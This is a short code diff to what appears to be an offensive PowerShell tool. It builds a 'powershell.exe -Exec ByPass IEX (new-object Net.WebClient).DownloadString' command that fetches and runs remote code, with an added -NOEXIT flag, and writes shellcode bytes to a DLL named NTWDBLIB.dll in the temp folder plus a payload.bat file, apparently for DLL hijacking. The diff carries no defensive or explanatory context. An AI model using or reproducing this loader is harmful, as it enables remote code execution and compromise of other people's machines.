@@ -39,7 +39,7 @@ Param(
 	$url,
 
 [Parameter(Position = 1)]
-	[String[]] $command
+	[String] $command = "$null"
     
 )
 
@@ -2926,7 +2926,7 @@ Param(
 add-content -value $sc64 -encoding byte -path $env:temp\NTWDBLIB.dll
 
 
-$powercommand = "powershell.exe -Exec ByPass IEX (new-object Net.WebClient).DownloadString('$url'); $command "
+$powercommand = "powershell.exe -NOEXIT -Exec ByPass IEX (new-object Net.WebClient).DownloadString('$url'); $command "
 $powercommand 
 $powercommand | OUT-file -encoding default -file $env:temp\payload.bat
 #$Spayload= "start /b %temp%\pay.bat" | OUT-file -encoding default -file $env:temp\payload.bat
